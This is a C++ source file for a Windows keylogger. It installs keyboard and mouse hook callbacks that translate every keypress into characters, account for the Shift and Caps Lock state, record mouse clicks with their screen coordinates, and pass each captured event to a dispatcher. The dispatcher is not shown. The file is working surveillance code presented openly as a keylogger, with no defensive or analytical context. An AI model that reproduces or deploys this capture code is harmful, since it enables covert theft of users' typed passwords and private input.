#include "Keylogger.hpp"

extern HHOOK g_hook[2];

std::shared_ptr<Dispatcher> Keylogger::_disp = NULL;
bool Keylogger::_maj = false;
bool Keylogger::_capsLock = false;

LRESULT CALLBACK Keylogger::handleKey(int code, WPARAM wParam, LPARAM lParam)
{
	if (code != HC_ACTION)
		return CallNextHookEx(NULL, code, wParam, lParam);

	DWORD tmp = static_cast<DWORD>(lParam);
	int count = tmp & 0xFFFF;
	int scanCode = tmp & 0xFF0000;
	bool extend = (tmp & 0x1000000) == 0x1000000;
	bool context = (tmp & 0x20000000) == 0x20000000;
	bool up = (tmp & 0x40000000) == 0x40000000;
	bool transition = (tmp & 0x80000000) == 0x80000000;

	if (!up)
	{
		if (wParam == VK_SHIFT)
			_maj = true;
		if (wParam == VK_CAPITAL)
			_capsLock = true;

		wchar_t name[255] = { 0 };
		char c;
		BYTE keyboardState[256] = { 0 };

		if (!GetKeyboardState(keyboardState))
			return CallNextHookEx(g_hook[0], code, wParam, lParam);
		int size = ToUnicode(static_cast<UINT>(wParam), scanCode, keyboardState, name, 0xFF, 0);
		if (size > 0 && _disp)
		{
			if (size == 1 && name[0] >= 0x41 && name[0] <= 0x5A)
			{
				c = static_cast<char>(name[0]);
				if ((_maj && !_capsLock) || (!_maj && _capsLock))
					c += 32;
				_disp->dispatch(KeyStroke(std::string({ c, 0 })));
			}
			else
				_disp->dispatch(KeyStroke(std::string(reinterpret_cast<char *>(name))));
		}
	}
	else
	{
		if (wParam == VK_SHIFT)
			_maj = false;
		if (wParam == VK_CAPITAL)
			_capsLock = false;
	}
	return CallNextHookEx(g_hook[0], code, wParam, lParam);
}

LRESULT CALLBACK Keylogger::handleMouse(int code, WPARAM wParam, LPARAM lParam)
{
	if (code == HC_ACTION && lParam && _disp)
	{
		MOUSEHOOKSTRUCT *param = (MOUSEHOOKSTRUCT *)lParam;

		if (param->wHitTestCode == HTCLIENT)
			switch (wParam)
			{
				case WM_LBUTTONDOWN:
					_disp->dispatch(MouseClick(MouseClick::LEFTBUTTON, static_cast<unsigned short>(param->pt.x), static_cast<unsigned short>(param->pt.y)));
					break;
				case WM_MBUTTONDOWN:
					_disp->dispatch(MouseClick(MouseClick::MIDDLEBUTTON, static_cast<unsigned short>(param->pt.x), static_cast<unsigned short>(param->pt.y)));
					break;
				case WM_RBUTTONDOWN:
					_disp->dispatch(MouseClick(MouseClick::RIGHTBUTTON, static_cast<unsigned short>(param->pt.x), static_cast<unsigned short>(param->pt.y)));
					break;
				case WM_MOUSEWHEEL:
					_disp->dispatch(MouseClick(MouseClick::WHEEL, static_cast<unsigned short>(param->pt.x), static_cast<unsigned short>(param->pt.y)));
					break;

				default:
					break;
			}
	}
	return CallNextHookEx(g_hook[1], code, wParam, lParam);
}

void Keylogger::setDispatcher(std::shared_ptr<Dispatcher> disp)
{
	_disp = disp;
}